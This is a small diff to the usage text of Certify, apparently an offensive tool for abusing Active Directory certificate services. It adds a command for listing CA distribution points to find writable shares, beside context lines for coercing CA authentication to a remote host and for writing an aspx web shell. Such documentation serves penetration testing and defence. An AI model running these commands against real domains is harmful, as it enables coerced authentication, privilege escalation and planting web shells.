@@ -110,7 +110,11 @@ Certify is a C# tool to enumerate and abuse misconfigurations in Active Director
       Coerce the CA server to perform an authentication attempt to a remote host:
 
         Certify.exe coerceauth /ca:SERVER\ca-name /target:Target
+        
 
+      Get the current CDP list. Useful to find remote writable shares:
+
+        Certify.exe writefile /ca:SERVER\ca-name /readonly
 
       Write an aspx shell to a local web directory:
 
